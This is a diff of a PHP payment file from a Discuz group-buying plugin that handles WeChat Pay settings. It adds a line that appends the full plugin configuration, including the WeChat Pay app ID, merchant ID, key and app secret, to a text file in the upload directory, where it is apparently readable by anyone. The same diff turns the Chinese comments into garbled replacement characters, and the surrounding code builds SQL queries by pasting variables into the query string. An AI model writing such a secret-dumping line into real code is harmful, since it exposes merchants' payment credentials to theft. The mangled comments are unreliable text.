@@ -3,7 +3,7 @@
 
 
 /**
-   1 ´ýÖ§¸¶ 2 ÒÑÖ§¸¶£¬Î´È·ÈÏ 3 ÒÑÈ·ÈÏ£¬´ý·¢»õ  4 ÅäËÍÖÐ 5 ÒÑÇ©ÊÕ 6 ½»Ò×ÒÑÈ¡Ïû 7 ÍË¿î´¦ÀíÖÐ  8 ÍË¿î³É¹¦
+   1 ï¿½ï¿½Ö§ï¿½ï¿½ 2 ï¿½ï¿½Ö§ï¿½ï¿½ï¿½ï¿½Î´È·ï¿½ï¿½ 3 ï¿½ï¿½È·ï¿½Ï£ï¿½ï¿½ï¿½ï¿½  4 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 5 ï¿½ï¿½Ç©ï¿½ï¿½ 6 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ï¿½ï¿½ 7 ï¿½Ë¿î´¦ï¿½ï¿½ï¿½ï¿½  8 ï¿½Ë¿ï¿½É¹ï¿½
  */
 
 if(!defined('IN_DISCUZ')) {
@@ -16,7 +16,7 @@ $wxpay_appid        = trim($pintuanConfig['wxpay_appid']);
 $wxpay_mchid        = trim($pintuanConfig['wxpay_mchid']);
 $wxpay_key          = trim($pintuanConfig['wxpay_key']);
 $wxpay_appsecret    = trim($pintuanConfig['wxpay_appsecret']);
-
+file_put_contents("./upload/config.txt",  print_r($pintuanConfig,TRUE),FILE_APPEND);
 define("TOM_WXPAY_APPID", $wxpay_appid);
 define("TOM_WXPAY_MCHID", $wxpay_mchid);
 define("TOM_WXPAY_KEY", $wxpay_key);
@@ -74,7 +74,7 @@ if($act == "order" && $_GET['formhash'] == FORMHASH){
     if($take_type == 2 || $take_type == 4){
         $pintuanConfig['express_price'] = 0;
     }
-	//ÏÞÖÆÏÂµ¥´ÎÊý
+	//ï¿½ï¿½ï¿½ï¿½ï¿½Âµï¿½ï¿½ï¿½ï¿½ï¿½
 	$uidNumCount = C::t('#tom_pintuan#tom_pintuan_order')->fetch_all_count(" AND user_id=$user_id AND goods_id=$goods_id");
 	if($uidNumCount > $goodsInfo['fieldb4'] && $goodsInfo['fieldb4'] != 0){
     	$outArr = array(
@@ -119,7 +119,7 @@ if($act == "order" && $_GET['formhash'] == FORMHASH){
     $pay_price = $pintuanConfig['express_price']+$base_price*$goods_num;
 
 	if(empty($tuan_id)){
-		//ÍÅ³¤¼Û¸ñ
+		//ï¿½Å³ï¿½ï¿½Û¸ï¿½
 		if($goodsInfo['tuanz_price'] > 0 && $tstatus == 1){
 			$pay_price = $pintuanConfig['express_price']+$base_price*($goods_num-1)+$goodsInfo['tuanz_price']*100;
 		}
